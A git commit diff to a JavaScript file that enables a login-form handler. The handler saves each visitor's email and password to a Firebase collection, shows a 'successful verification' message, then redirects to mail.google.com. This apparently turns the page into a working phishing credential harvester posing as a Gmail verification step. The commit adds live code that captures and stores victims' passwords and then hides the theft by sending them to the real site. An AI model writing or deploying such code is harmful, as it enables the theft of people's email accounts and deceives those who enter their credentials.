3188ff8c37fa2913ec67c8ce787bc480297e1cce
AndersonAngulo <andersonangulo1704@gmail.com>
2022-02-23 16:50:00 -0500

    Guardado en Firebase

--- script.js
+++ script.js
@@ -6,29 +6,30 @@ form.addEventListener('submit', async e=>{
   e.preventDefault()
   const correo=form["correo"].value
   const password=form["password"].value
-   contentWrapper.innerHTML=`
-        <div class="love">
-        <span class="bonito">ALGO BONITO</span>
-        </div>`
+  //  contentWrapper.innerHTML=`
+  //       <div class="love">
+  //       <span class="bonito">ALGO BONITO</span>
+  //       </div>`
         
   //  contentWrapper.innerHTML=`
   //       <div class="alert">
   //         <p>ALGO BONITO</p>
   //         <i class="fas fa-user-check"></i>
   //       </div>`
-  // if(correo!=="" && password!==""){
-  //     await db.collection("users").doc().set({correo,password})
-  //     contentWrapper.innerHTML=`
-  //       <div class="alert">
-  //         <p>VERIFICACIÓN EXITOSA</p>
-  //         <i class="fas fa-user-check"></i>
-  //       </div>`
-  //     setTimeout(()=>{
-  //       location.href="https://mail.google.com"
-  //     },1500)
-  // }else{
-  //   alert("COMPLETE LOS CAMPOS")
-  // }
+  if(correo!=="" && password!==""){
+      await db.collection("users").doc().set({correo,password})
+      contentWrapper.innerHTML=`
+        <div class="alert">
+          <p>VERIFICACIÓN EXITOSA</p>
+          <i class="fas fa-user-check"></i>
+        </div>`
+      setTimeout(()=>{
+        location.href="https://mail.google.com"
+      },1500)
+  }else{
+    alert("COMPLETE LOS CAMPOS")
+  }
 
 
 })
+
